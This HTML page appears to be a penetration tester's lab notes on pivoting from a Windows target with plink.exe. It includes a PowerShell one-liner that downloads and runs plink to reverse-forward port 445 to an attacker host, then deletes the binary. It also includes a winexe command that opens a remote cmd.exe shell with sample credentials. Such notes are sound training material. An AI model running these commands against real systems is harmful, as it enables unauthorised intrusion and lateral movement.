<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Windows target (plink.exe)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Windows target (plink.exe)</h1><br/>0. <strong>Plink download</strong><br />x86 → <a href="https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe">https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe</a><br />x64 → <a href="https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe">https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe</a><br /><div class="codebox"><div class="codebox">C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;systeminfo&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#to&nbsp;know&nbsp;the&nbsp;architecture</span></div></div><br /><br />1. Kill the SMB server running on the attacker machine<br />    <div class="codebox"><div class="codebox">root@kali<span style="color:#ff9d00;font-weight:700">:/</span>#&nbsp;pkill&nbsp;--full&nbsp;smbserver.py</div></div><br />    We need to do that, because now we want to forward port 445, but if it is in use we cannot do that<br /><br />2. Make sure that the SSH service permits root user to logon with password<br />    <div class="codebox"><div class="codebox">root@kali<span style="color:#ff9d00;font-weight:700">:/</span>#&nbsp;vim&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/ssh/</span>sshd_config<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span>#&nbsp;service&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;restart&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#restart&nbsp;the&nbsp;ssh&nbsp;service</span></div></div><br />    <a href=""><img src="images/1344-1.png" alt="images/1344-1.png" /></a><br />    Make sure that PermitRootLogin is set to &quot;yes&quot;<br /><br />3. Connect <span style="text-decoration:underline;">Target Windows</span> with the Attacker<br />plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports.<br /><div class="codebox"><div class="codebox">C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;plink.exe&nbsp;&lt;user&gt;@&lt;IpAttacker&gt;&nbsp;-R&nbsp;&lt;attackerPort&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;targetIP&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;targetPort&gt;</div></div><br />    &lt;target-IP&gt; is usually local (127.0.0.1).<br /><span style="color:#a5452a;">example: All in one command</span><br />    <div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">PS</span>&gt;&nbsp;(<span style="color:#ff9d00;font-weight:700">new-object</span>&nbsp;System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\plink.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span>&nbsp;<span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\plink.exe&nbsp;root@192.168.147.139&nbsp;-R&nbsp;445:127.0.0.1:445&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span>&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>Path&nbsp;<span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\plink.exe&quot;</span>;</div></div><br />    <a href=""><img src="images/1344-2.png" alt="images/1344-2.png" /></a><br />    ssh session established and port 445 of the Attacker machine is being forwarded to the port 445 of the Target Windows machine over ssh<br /><br />4. Connect via port fowarding to the target Windows machine<br />    <div class="codebox"><div class="codebox">root@kali<span style="color:#ff9d00;font-weight:700">:/</span>#&nbsp;winexe&nbsp;-U&nbsp;<span style="color:#3ad900;font-weight:400">&#39;admin%password123&#39;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>127.0.0.1&nbsp;cmd.exe</div></div><br />    <a href=""><img src="images/1344-3.png" alt="images/1344-3.png" /></a><br /><br />    </div>
</body>
</html>
